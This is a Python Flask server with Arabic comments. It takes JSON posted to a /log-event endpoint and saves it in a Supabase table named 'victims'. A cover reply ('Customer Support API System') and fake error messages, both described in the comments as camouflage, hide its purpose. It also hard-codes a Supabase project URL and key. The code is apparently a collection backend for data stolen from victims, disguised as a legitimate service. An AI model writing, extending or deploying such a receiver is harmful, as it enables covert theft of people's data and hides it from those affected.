import os
from flask import Flask, jsonify, request
from supabase import create_client, Client

app = Flask(__name__)

# الإعدادات الخاصة بمشروعك (جاهزة ومجربة)
URL = "https://bozherhsarcovutvproa.supabase.co"
KEY = "sb_publishable_WgwSb3OjPOv1KOvPK7SJ7A_4u6UDIYY"
supabase: Client = create_client(URL, KEY)

@app.route('/')
def home():
    # رسالة تمويه للمتصفح العادي
    return jsonify({"status": "online", "service": "Customer Support API System"})

@app.route('/log-event', methods=['POST'])
def log_event():
    try:
        payload = request.json
        if not payload:
            return jsonify({"status": "error"}), 400

        # حفظ البيانات في جدول victims الذي أنشأته
        supabase.table('victims').insert({"victim_data": payload}).execute()
        
        return jsonify({"status": "success"})
    except:
        # رسالة خطأ وهمية للتمويه
        return jsonify({"status": "internal_error"}), 500

@app.route('/health-check')
def health_check():
    try:
        # التأكد من الاتصال بقاعدة البيانات
        supabase.table('victims').select("id").limit(1).execute()
        return jsonify({"status": "synchronized", "db": "connected"})
    except:
        return jsonify({"status": "offline"}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
